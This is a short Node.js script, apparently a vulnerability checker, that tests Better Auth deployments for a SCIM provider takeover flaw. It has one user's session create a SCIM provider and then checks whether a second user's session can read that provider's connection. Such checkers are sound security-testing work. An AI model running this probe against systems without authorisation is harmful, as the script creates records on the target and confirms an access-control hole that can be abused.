#!/usr/bin/env node
// Better Auth SCIM Provider Takeover Non-Destructive Scanner
// Usage: node check.js <BASE_URL> <ALICE_TOKEN> <BOB_TOKEN> [PROVIDER_ID]

const [,, BASE_URL, ALICE_TOKEN, BOB_TOKEN, PROVIDER_ID = "corp-idp"] = process.argv;

if (!BASE_URL || !ALICE_TOKEN || !BOB_TOKEN) {
  console.log("Usage: node check.js <BASE_URL> <ALICE_TOKEN> <BOB_TOKEN> [PROVIDER_ID]");
  process.exit(1);
}

const req = (endpoint, token, opts = {}) => fetch(`${BASE_URL}${endpoint}`, {
  ...opts,
  headers: { 
    "Content-Type": "application/json", 
    "Origin": new URL(BASE_URL).origin,
    "Cookie": `better-auth.session_token=${token}`
  }
});

async function run() {
  console.log("[*] Alice creates provider...");
  await req("/scim/generate-token", ALICE_TOKEN, { method: "POST", body: JSON.stringify({ providerId: PROVIDER_ID }) });

  console.log("[*] Bob attempts to read Alice's provider metadata without rotating the token...");
  const res = await req(`/scim/get-provider-connection?providerId=${PROVIDER_ID}`, BOB_TOKEN);
  
  if (res.status === 200) {
    console.log("[VULNERABLE] Bob successfully read Alice's provider connection! Target is vulnerable.");
    process.exit(1);
  } else {
    console.log("[SAFE] Bob was denied access to read the provider.");
    process.exit(0);
  }
}
run();
